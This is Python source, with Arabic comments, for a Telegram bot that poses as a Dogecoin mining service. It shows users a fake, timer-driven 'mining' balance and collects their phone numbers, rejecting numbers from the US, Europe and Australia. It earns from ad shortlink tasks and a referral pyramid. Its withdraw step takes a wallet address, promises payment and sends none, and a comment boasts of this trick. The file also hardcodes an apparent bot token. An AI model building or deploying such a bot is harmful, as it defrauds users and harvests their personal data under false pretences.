from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import sqlite3
import time
import random
import re

TOKEN = "8960593021:AAFkF-8Cvt_jsOHJmNUyBGWMvzmE0hIbMbk"
OWNER_ID = 6610111288
DB_PATH = "/tmp/doge_bot.db"

# ================= إعداد قاعدة البيانات =================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                        user_id INTEGER PRIMARY KEY,
                        phone TEXT,
                        balance REAL DEFAULT 0.0,
                        speed_per_sec REAL DEFAULT 0.0000000115, -- 0.001 per day
                        last_update INTEGER,
                        captcha_time INTEGER DEFAULT 0,
                        referrer_id INTEGER DEFAULT 0,
                        state TEXT DEFAULT 'idle')''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS custom_buttons (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        name TEXT,
                        url TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS shortlinks (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        url TEXT,
                        password TEXT,
                        reward REAL DEFAULT 0.001)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS completed_links (
                        user_id INTEGER,
                        link_id INTEGER,
                        last_done INTEGER)''')
    conn.commit()
    conn.close()

init_db()

# ================= الدوال المساعدة للتواصل مع تيليجرام =================
def call_api(method, payload):
    api_url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    req = urllib.request.Request(api_url, data=json.dumps(payload).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try:
        response = urllib.request.urlopen(req)
        return json.loads(response.read().decode('utf-8'))
    except Exception as e:
        return None

def send_msg(chat_id, text, markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if markup: payload["reply_markup"] = markup
    call_api("sendMessage", payload)

def edit_msg(chat_id, msg_id, text, markup=None):
    payload = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": "HTML"}
    if markup: payload["reply_markup"] = markup
    call_api("editMessageText", payload)

# ================= المحرك الرئيسي =================
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            data = json.loads(body.decode('utf-8'))
            
            if 'message' in data:
                self.handle_message(data['message'])
            elif 'callback_query' in data:
                self.handle_callback(data['callback_query'])
                
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except Exception:
            self.send_response(500)
            self.end_headers()
        return

    def handle_message(self, msg):
        chat_id = msg['chat']['id']
        user_id = msg['from']['id']
        text = msg.get('text', '')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT phone, captcha_time, state FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        
        # تسجيل جديد + نظام الإحالات
        if not user:
            ref_id = 0
            if text.startswith("/start "):
                try: ref_id = int(text.split(" ")[1])
                except: pass
            
            c.execute("INSERT INTO users (user_id, last_update, referrer_id) VALUES (?, ?, ?)", (user_id, int(time.time()), ref_id))
            conn.commit()
            user = (None, 0, 'idle')

        phone, captcha_time, state = user
        now = int(time.time())

        # 1. التحقق من الرقم (منع أمريكا/أوروبا/أستراليا)
        if not phone:
            if 'contact' in msg and msg['contact']['user_id'] == user_id:
                p_num = msg['contact']['phone_number']
                if not p_num.startswith('+'): p_num = '+' + p_num
                
                # Regex لمنع أمريكا (+1)، أستراليا (+61)، أوروبا (+3, +4 باستثناء روسيا +7)
                if re.match(r'^\+(1|3|4|61)', p_num) and not p_num.startswith('+7'):
                    send_msg(chat_id, "❌ رقمك من منطقة غير مدعومة في النظام.")
                    return
                c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (p_num, user_id))
                conn.commit()
                send_msg(chat_id, "✅ تم التحقق من الرقم، جاري التحميل...", {"remove_keyboard": True})
                self.send_captcha(chat_id, user_id)
            else:
                markup = {"keyboard": [[{"text": "📱 إرسال جهة الاتصال للتحقق", "request_contact": True}]], "resize_keyboard": True, "one_time_keyboard": True}
                send_msg(chat_id, "⚠️ <b>خطوة أمنية:</b>\nللتأكد من أنك لست روبوت، قم بمشاركة رقم هاتفك للبدء (الأرقام الوهمية محظورة).", markup)
            return

        # 2. الكابتشا (كل ساعة)
        if now - captcha_time > 3600:
            self.send_captcha(chat_id, user_id)
            return

        # 3. معالجة حالات الإدخال (States)
        if state.startswith('wait_pass_'):
            link_id = int(state.split('_')[2])
            c.execute("SELECT password, reward FROM shortlinks WHERE id = ?", (link_id,))
            link_data = c.fetchone()
            if link_data and text == link_data[0]:
                c.execute("UPDATE users SET balance = balance + ?, state = 'idle' WHERE user_id = ?", (link_data[1], user_id))
                c.execute("INSERT INTO completed_links (user_id, link_id, last_done) VALUES (?, ?, ?)", (user_id, link_id, now))
                conn.commit()
                send_msg(chat_id, f"🎉 <b>إجابة صحيحة!</b> تمت إضافة {link_data[1]} DOGE إلى رصيدك.")
            else:
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                send_msg(chat_id, "❌ <b>كلمة السر خاطئة!</b> حاول تخطي الرابط مرة أخرى.")
            self.send_main_menu(chat_id, user_id, c)
            return

        elif state == 'wait_withdraw':
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            # الدهاء هنا: نقبل المحفظة، ثم نصدمه بالشروط لو رصيده/إحالاته ما كافية (في الواجهة الحقيقية)
            send_msg(chat_id, "⏳ تم استلام المحفظة، جاري المراجعة والأرسال قريباً.")
            self.send_main_menu(chat_id, user_id, c)
            return
            
        elif state == 'wait_broadcast' and user_id == OWNER_ID:
            # هنا يتم إرسال الإذاعة (بشكل مبسط)
            c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, "📢 تم تسجيل الإذاعة.")
            self.send_owner_panel(chat_id)
            return

        # 4. لوحة المالك والأوامر العادية
        if text == "/start":
            self.send_main_menu(chat_id, user_id, c)
        elif text == "/owner" and user_id == OWNER_ID:
            self.send_owner_panel(chat_id)
            
        conn.close()

    def handle_callback(self, cq):
        chat_id = cq['message']['chat']['id']
        user_id = cq['from']['id']
        data = cq['data']
        msg_id = cq['message']['message_id']
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        if data.startswith("cap_"):
            ans = data.split("_")[1]
            if ans == "ok":
                c.execute("UPDATE users SET captcha_time = ? WHERE user_id = ?", (int(time.time()), user_id))
                conn.commit()
                edit_msg(chat_id, msg_id, "✅ تم التحقق بنجاح!")
                self.send_main_menu(chat_id, user_id, c)
            else:
                edit_msg(chat_id, msg_id, "❌ فشل التحقق الأمني.")
                self.send_captcha(chat_id, user_id)
                
        elif data == "refresh":
            self.update_mining_balance(user_id, c)
            conn.commit()
            self.edit_main_menu(chat_id, user_id, msg_id, c)
            
        elif data == "team":
            self.show_team(chat_id, user_id, c)
            
        elif data == "shortlinks":
            self.show_shortlinks(chat_id, user_id, c)
            
        elif data.startswith("do_link_"):
            link_id = data.split("_")[2]
            c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f"wait_pass_{link_id}", user_id))
            conn.commit()
            send_msg(chat_id, "🔗 <b>خطوات المهمة:</b>\n1. ادخل الرابط وتخطى الإعلانات.\n2. ستجد <b>كلمة سر</b> في الصفحة الأخيرة.\n3. أرسل كلمة السر هنا في البوت الآن:")
            
        elif data == "withdraw":
            c.execute("UPDATE users SET state = 'wait_withdraw' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, "💸 <b>سحب الأرباح:</b>\n\nأرسل الآن عنوان محفظة <b>Dogecoin (FaucetPay)</b> الخاصة بك:")
            
        elif data == "owner_panel" and user_id == OWNER_ID:
            self.send_owner_panel(chat_id)
            
        elif data == "broadcast" and user_id == OWNER_ID:
            c.execute("UPDATE users SET state = 'wait_broadcast' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, "📢 أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:")
            
        conn.close()

    # ================= الوظائف الفرعية =================
    def send_captcha(self, chat_id, user_id):
        # كابتشا خفية: الأزرار لا تخبره ماذا يضغط، يجب أن يكتشف النمط
        btns = [{"text": "💠", "callback_data": "cap_fail"}, {"text": "💠", "callback_data": "cap_fail"}, {"text": "💠", "callback_data": "cap_fail"}]
        correct_idx = random.randint(0, 2)
        btns[correct_idx] = {"text": "🛑", "callback_data": "cap_ok"}
        markup = {"inline_keyboard": [btns]}
        send_msg(chat_id, "🤖 <b>تحقق أمني:</b>\nاضغط على الرمز المختلف للمتابعة.", markup)

    def update_mining_balance(self, user_id, cursor):
        now = int(time.time())
        cursor.execute("SELECT balance, speed_per_sec, last_update FROM users WHERE user_id = ?", (user_id,))
        row = cursor.fetchone()
        if row:
            bal, speed, last = row
            delta = now - last
            earned = delta * speed
            new_bal = bal + earned
            cursor.execute("UPDATE users SET balance = ?, last_update = ? WHERE user_id = ?", (new_bal, now, user_id))
            return new_bal
        return 0

    def get_main_menu_markup(self, user_id, cursor):
        btns = [
            [{"text": "🔄 تحديث الرصيد التلقائي", "callback_data": "refresh"}],
            [{"text": "🔗 مهام الروابط المختصرة", "callback_data": "shortlinks"}],
            [{"text": "👥 فريقك (زيادة السرعة)", "callback_data": "team"}, {"text": "💸 سحب", "callback_data": "withdraw"}]
        ]
        
        cursor.execute("SELECT name, url FROM custom_buttons")
        for btn in cursor.fetchall():
            btns.append([{"text": btn[0], "url": btn[1]}])
            
        if user_id == OWNER_ID:
            btns.append([{"text": "👑 الإدارة", "callback_data": "owner_panel"}])
            
        return {"inline_keyboard": btns}

    def send_main_menu(self, chat_id, user_id, cursor):
        self.update_mining_balance(user_id, cursor)
        cursor.execute("SELECT balance, speed_per_sec FROM users WHERE user_id = ?", (user_id,))
        bal, speed = cursor.fetchone()
        
        text = f"⛏️ <b>منجم Dogecoin النشط</b>\n\n💰 الرصيد المباشر:\n<code>{bal:.8f}</code> <b>DOGE</b>\n\n⚡ السرعة: <code>{speed*86400:.4f}</code> يومياً\n\n<i>العداد يعمل في الخلفية، اضغط تحديث لرؤية الأرباح الجديدة.</i>"
        send_msg(chat_id, text, self.get_main_menu_markup(user_id, cursor))

    def edit_main_menu(self, chat_id, user_id, msg_id, cursor):
        cursor.execute("SELECT balance, speed_per_sec FROM users WHERE user_id = ?", (user_id,))
        bal, speed = cursor.fetchone()
        text = f"⛏️ <b>منجم Dogecoin النشط</b>\n\n💰 الرصيد المباشر:\n<code>{bal:.8f}</code> <b>DOGE</b>\n\n⚡ السرعة: <code>{speed*86400:.4f}</code> يومياً\n\n<i>العداد يعمل في الخلفية، اضغط تحديث لرؤية الأرباح الجديدة.</i>"
        edit_msg(chat_id, msg_id, text, self.get_main_menu_markup(user_id, cursor))

    def show_team(self, chat_id, user_id, cursor):
        link = f"https://t.me/YOUR_BOT_USERNAME?start={user_id}"
        text = f"👥 <b>نظام الإحالات الهرمي (فريقك):</b>\n\n🥇 <b>الجيل الأول:</b> +30% سرعة تعدين + 0.001 DOGE كاش.\n🥈 <b>الجيل الثاني:</b> +10% سرعة تعدين.\n\n🔗 رابطك:\n<code>{link}</code>"
        markup = {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "refresh"}]]}
        send_msg(chat_id, text, markup)

    def show_shortlinks(self, chat_id, user_id, cursor):
        now = int(time.time())
        cursor.execute("SELECT id, reward FROM shortlinks")
        links = cursor.fetchall()
        
        btns = []
        for l in links:
            cursor.execute("SELECT last_done FROM completed_links WHERE user_id = ? AND link_id = ?", (user_id, l[0]))
            done = cursor.fetchone()
            if not done or (now - done[0] > 86400):
                btns.append([{"text": f"🔗 مهمة رابط (+{l[1]} DOGE)", "callback_data": f"do_link_{l[0]}"}])
                
        btns.append([{"text": "🔙 رجوع", "callback_data": "refresh"}])
        send_msg(chat_id, "🔗 <b>تخطي الروابط:</b>\nالمهام تتجدد كل 24 ساعة.", {"inline_keyboard": btns})

    def send_owner_panel(self, chat_id):
        btns = [
            [{"text": "📢 إذاعة", "callback_data": "broadcast"}],
            [{"text": "➕ إضافة رابط مختصر", "callback_data": "add_shortlink"}],
            [{"text": "➕ إضافة زر مخصص", "callback_data": "add_btn"}],
            [{"text": "🔙 للمنجم", "callback_data": "refresh"}]
        ]
        send_msg(chat_id, "👑 <b>لوحة التحكم المطلقة:</b>", {"inline_keyboard": btns})
            
